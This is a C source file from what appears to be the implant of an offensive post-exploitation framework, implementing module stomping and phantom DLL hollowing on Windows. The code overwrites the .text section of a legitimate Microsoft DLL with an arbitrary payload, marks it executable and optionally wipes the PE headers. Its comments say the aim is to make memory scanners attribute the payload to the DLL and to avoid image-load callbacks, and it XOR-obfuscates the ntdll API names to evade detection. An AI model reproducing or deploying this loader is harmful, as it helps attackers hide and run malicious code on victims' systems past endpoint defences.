/*
 * postex_loader.c — Post-exploitation payload loading techniques.
 *
 * Implements module stomping and phantom DLL hollowing for loading
 * payloads into image-backed memory regions.
 */
#include "agent.h"
#include "postex_loader.h"
#include "pe_stomp.h"
#include "memory_cleanup.h"
#include "api_resolve.h"

#ifdef CONFIG_INDIRECT_SYSCALLS
#include "syscalls_wrappers.h"
#endif

/* ─── Helpers ─── */

static void _set_err(LOAD_RESULT *r, const char *msg) {
    if (!r) return;
    r->success = FALSE;
    r->lastError = GetLastError();
    if (msg) {
        strncpy(r->errorMsg, msg, sizeof(r->errorMsg) - 1);
        r->errorMsg[sizeof(r->errorMsg) - 1] = '\0';
    }
}

BOOL postex_get_text_section(HMODULE hMod, void **textBase, DWORD *textSize) {
    if (!hMod || !textBase || !textSize) return FALSE;

    unsigned char *base = (unsigned char *)hMod;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    WORD numSections = nt->FileHeader.NumberOfSections;

    for (WORD i = 0; i < numSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            *textBase = base + section[i].VirtualAddress;
            *textSize = section[i].Misc.VirtualSize;
            return TRUE;
        }
    }

    return FALSE;
}

/* ─── Candidate DLL list for auto-selection ─── */

static const wchar_t *g_stompCandidates[] = {
    STOMP_DLL_DEFAULT,
    STOMP_DLL_ALT1,
    STOMP_DLL_ALT2,
    STOMP_DLL_ALT3,
    NULL
};

const wchar_t *postex_select_stomp_dll(SIZE_T minSize) {
    for (int i = 0; g_stompCandidates[i] != NULL; i++) {
        /* Try to load the DLL to check its .text size */
        HMODULE hMod = LoadLibraryExW(g_stompCandidates[i],
                                       NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (!hMod) continue;

        void *textBase;
        DWORD textSize;
        BOOL found = postex_get_text_section(hMod, &textBase, &textSize);
        FreeLibrary(hMod);

        if (found && textSize >= minSize) {
            return g_stompCandidates[i];
        }
    }
    return NULL;
}

/* ═══════════════════════════════════════════════════════════════════
 *  MODULE STOMPING
 *
 *  1. LoadLibraryEx with DONT_RESOLVE_DLL_REFERENCES (no DllMain)
 *  2. Find .text section in the loaded DLL
 *  3. VirtualProtect → RW
 *  4. Overwrite .text with our payload
 *  5. VirtualProtect → RX
 *  6. Optionally stomp PE headers
 *
 *  Result: our payload lives in image-backed memory attributed to
 *  a legitimate Microsoft DLL. Memory scanners see the DLL path.
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL _load_module_stomp(const unsigned char *payload, SIZE_T payloadLen,
                                const LOAD_OPTS *opts, LOAD_RESULT *result)
{
    const wchar_t *dllPath = opts->sacrificialDll;

    /* Auto-select if not specified */
    if (!dllPath) {
        dllPath = postex_select_stomp_dll(payloadLen);
        if (!dllPath) {
            _set_err(result, "No sacrificial DLL large enough for payload");
            return FALSE;
        }
    }

    /*
     * DONT_RESOLVE_DLL_REFERENCES: loads the DLL but doesn't call DllMain
     * and doesn't resolve imports. We just want the memory mapping.
     */
    HMODULE hMod = LoadLibraryExW(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hMod) {
        _set_err(result, "LoadLibraryExW failed on sacrificial DLL");
        return FALSE;
    }

    /* Find .text section */
    void *textBase;
    DWORD textSize;
    if (!postex_get_text_section(hMod, &textBase, &textSize)) {
        FreeLibrary(hMod);
        _set_err(result, "Failed to find .text section in sacrificial DLL");
        return FALSE;
    }

    /* Verify payload fits */
    if (payloadLen > textSize) {
        FreeLibrary(hMod);
        _set_err(result, "Payload too large for sacrificial DLL .text section");
        return FALSE;
    }

    /* Make .text writable */
    DWORD oldProtect;
    if (!VirtualProtect(textBase, textSize, PAGE_READWRITE, &oldProtect)) {
        FreeLibrary(hMod);
        _set_err(result, "VirtualProtect RW failed on .text section");
        return FALSE;
    }

    /* Zero the entire .text section first, then copy payload */
    SecureZeroMemory(textBase, textSize);
    memcpy(textBase, payload, payloadLen);

    /* Flip to RX — never RWX */
    if (!VirtualProtect(textBase, textSize, PAGE_EXECUTE_READ, &oldProtect)) {
        /* Try to clean up */
        SecureZeroMemory(textBase, textSize);
        FreeLibrary(hMod);
        _set_err(result, "VirtualProtect RX failed on .text section");
        return FALSE;
    }

    /* Optionally stomp PE headers */
    if (opts->stompHeaders) {
        pe_stomp_module(hMod);
    }

    result->success = TRUE;
    result->baseAddress = textBase;
    result->regionSize = textSize;
    result->hStompedModule = hMod;
    result->errorMsg[0] = '\0';

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════
 *  PHANTOM DLL HOLLOWING
 *
 *  1. Open a legitimate DLL on disk
 *  2. NtCreateSection with SEC_IMAGE (creates image section)
 *  3. NtMapViewOfSection into current process
 *  4. Overwrite .text with our payload (section is not yet linked)
 *  5. The mapped view is image-backed but contains our code
 *
 *  Unlike module stomping, this doesn't use LoadLibrary at all,
 *  so there's no image-load callback fired. The section exists
 *  in memory but isn't in the PEB's module list.
 * ═══════════════════════════════════════════════════════════════════ */

/* NtCreateSection prototype */
typedef NTSTATUS (NTAPI *pfnNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,      /* POBJECT_ATTRIBUTES */
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

/* NtMapViewOfSection prototype */
typedef NTSTATUS (NTAPI *pfnNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition, /* 1 = ViewShare, 2 = ViewUnmap */
    ULONG AllocationType,
    ULONG Win32Protect
);

/* NtUnmapViewOfSection prototype */
typedef NTSTATUS (NTAPI *pfnNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

#ifndef SEC_IMAGE
#define SEC_IMAGE 0x01000000
#endif

static BOOL _load_phantom_hollow(const unsigned char *payload, SIZE_T payloadLen,
                                  const LOAD_OPTS *opts, LOAD_RESULT *result)
{
    const wchar_t *dllPath = opts->sacrificialDll;
    if (!dllPath) {
        dllPath = postex_select_stomp_dll(payloadLen);
        if (!dllPath) {
            _set_err(result, "No sacrificial DLL large enough for payload");
            return FALSE;
        }
    }

    /* Resolve Nt functions */
    char _sn[] = {'n'^0x5A,'t'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
    for(int _i=0;_sn[_i];_i++) _sn[_i]^=0x5A;
    HMODULE hNtdll = GetModuleHandleA(_sn);
    SecureZeroMemory(_sn, sizeof(_sn));
    if (!hNtdll) {
        _set_err(result, "Failed to get ntdll handle");
        return FALSE;
    }

    char _sf1[] = {'N'^0x5A,'t'^0x5A,'C'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'t'^0x5A,'e'^0x5A,'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
    for(int _i=0;_sf1[_i];_i++) _sf1[_i]^=0x5A;
    pfnNtCreateSection NtCreateSection =
        (pfnNtCreateSection)GetProcAddress(hNtdll, _sf1);
    SecureZeroMemory(_sf1, sizeof(_sf1));

    char _sf2[] = {'N'^0x5A,'t'^0x5A,'M'^0x5A,'a'^0x5A,'p'^0x5A,'V'^0x5A,'i'^0x5A,'e'^0x5A,'w'^0x5A,'O'^0x5A,'f'^0x5A,'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
    for(int _i=0;_sf2[_i];_i++) _sf2[_i]^=0x5A;
    pfnNtMapViewOfSection NtMapViewOfSection =
        (pfnNtMapViewOfSection)GetProcAddress(hNtdll, _sf2);
    SecureZeroMemory(_sf2, sizeof(_sf2));

    char _sf3[] = {'N'^0x5A,'t'^0x5A,'U'^0x5A,'n'^0x5A,'m'^0x5A,'a'^0x5A,'p'^0x5A,'V'^0x5A,'i'^0x5A,'e'^0x5A,'w'^0x5A,'O'^0x5A,'f'^0x5A,'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
    for(int _i=0;_sf3[_i];_i++) _sf3[_i]^=0x5A;
    pfnNtUnmapViewOfSection NtUnmapViewOfSection =
        (pfnNtUnmapViewOfSection)GetProcAddress(hNtdll, _sf3);
    SecureZeroMemory(_sf3, sizeof(_sf3));

    if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection) {
        _set_err(result, "Failed to resolve Nt section functions");
        return FALSE;
    }

    /* Step 1: Open the sacrificial DLL on disk */
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        _set_err(result, "Failed to open sacrificial DLL file");
        return FALSE;
    }

    /* Step 2: Create an image section from the file */
    HANDLE hSection = NULL;
    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,                   /* ObjectAttributes */
        NULL,                   /* MaximumSize (use file size) */
        PAGE_READONLY,          /* SectionPageProtection */
        SEC_IMAGE,              /* AllocationAttributes — IMAGE section */
        hFile
    );

    CloseHandle(hFile);

    if (!NT_SUCCESS(status) || !hSection) {
        _set_err(result, "NtCreateSection(SEC_IMAGE) failed");
        return FALSE;
    }

    /* Step 3: Map the section into our process */
    void *viewBase = NULL;
    SIZE_T viewSize = 0;
    status = NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &viewBase,
        0,                      /* ZeroBits */
        0,                      /* CommitSize */
        NULL,                   /* SectionOffset */
        &viewSize,
        1,                      /* ViewShare */
        0,                      /* AllocationType */
        PAGE_READWRITE          /* Win32Protect — we need to write payload */
    );

    if (!NT_SUCCESS(status) || !viewBase) {
        CloseHandle(hSection);
        _set_err(result, "NtMapViewOfSection failed");
        return FALSE;
    }

    /* Step 4: Find .text section in the mapped view and overwrite */
    unsigned char *base = (unsigned char *)viewBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        NtUnmapViewOfSection(GetCurrentProcess(), viewBase);
        CloseHandle(hSection);
        _set_err(result, "Mapped view has invalid DOS signature");
        return FALSE;
    }

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
    WORD numSections = nt->FileHeader.NumberOfSections;

    void *textAddr = NULL;
    DWORD textSize = 0;

    for (WORD i = 0; i < numSections; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            textAddr = base + sections[i].VirtualAddress;
            textSize = sections[i].Misc.VirtualSize;
            break;
        }
    }

    if (!textAddr || textSize < payloadLen) {
        NtUnmapViewOfSection(GetCurrentProcess(), viewBase);
        CloseHandle(hSection);
        _set_err(result, "Mapped .text section too small or not found");
        return FALSE;
    }

    /* Make writable, copy payload, flip to RX */
    DWORD oldProtect;
    if (!VirtualProtect(textAddr, textSize, PAGE_READWRITE, &oldProtect)) {
        NtUnmapViewOfSection(GetCurrentProcess(), viewBase);
        CloseHandle(hSection);
        _set_err(result, "VirtualProtect RW failed on phantom .text");
        return FALSE;
    }

    SecureZeroMemory(textAddr, textSize);
    memcpy(textAddr, payload, payloadLen);

    if (!VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READ, &oldProtect)) {
        SecureZeroMemory(textAddr, textSize);
        NtUnmapViewOfSection(GetCurrentProcess(), viewBase);
        CloseHandle(hSection);
        _set_err(result, "VirtualProtect RX failed on phantom .text");
        return FALSE;
    }

    /* Optionally stomp headers */
    if (opts->stompHeaders) {
        DWORD headerSize = nt->OptionalHeader.SizeOfHeaders;
        DWORD hdrProt;
        if (VirtualProtect(viewBase, headerSize, PAGE_READWRITE, &hdrProt)) {
            SecureZeroMemory(viewBase, headerSize);
            VirtualProtect(viewBase, headerSize, hdrProt, &hdrProt);
        }
    }

    CloseHandle(hSection);

    result->success = TRUE;
    result->baseAddress = textAddr;
    result->regionSize = textSize;
    result->hStompedModule = NULL;  /* Not a loaded module */
    result->errorMsg[0] = '\0';

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Public API
 * ═══════════════════════════════════════════════════════════════════ */

BOOL postex_load(const unsigned char *payload, SIZE_T payloadLen,
                 const LOAD_OPTS *opts, LOAD_RESULT *result)
{
    if (!payload || payloadLen == 0 || !opts || !result) {
        if (result) _set_err(result, "Invalid arguments to postex_load");
        return FALSE;
    }

    memset(result, 0, sizeof(LOAD_RESULT));

    switch (opts->technique) {
        case LOAD_MODULE_STOMP:
            return _load_module_stomp(payload, payloadLen, opts, result);

        case LOAD_PHANTOM_HOLLOW:
            return _load_phantom_hollow(payload, payloadLen, opts, result);

        case LOAD_TRANSACTED:
            /* NTFS transaction hollowing — complex, deferred to future */
            _set_err(result, "Transacted hollowing not yet implemented");
            return FALSE;

        default:
            _set_err(result, "Unknown load technique");
            return FALSE;
    }
}

void postex_unload(LOAD_RESULT *result) {
    if (!result) return;

    if (result->baseAddress && result->regionSize > 0) {
        /* Zero the payload memory before freeing */
        DWORD oldProt;
        if (VirtualProtect(result->baseAddress, result->regionSize,
                           PAGE_READWRITE, &oldProt))
        {
            SecureZeroMemory(result->baseAddress, result->regionSize);
        }
    }

    if (result->hStompedModule) {
        /* Module stomping: FreeLibrary unloads the DLL */
        FreeLibrary(result->hStompedModule);
        result->hStompedModule = NULL;
    } else if (result->baseAddress) {
        /*
         * Phantom hollowing: need to unmap the view.
         * The base address we stored is .text, but unmap needs the view base.
         * Since we don't track it separately, use VirtualFree as fallback.
         * In practice, the phantom view persists until process exit.
         */
        /* Best effort — view will be cleaned up at process exit */
    }

    memset(result, 0, sizeof(LOAD_RESULT));
}
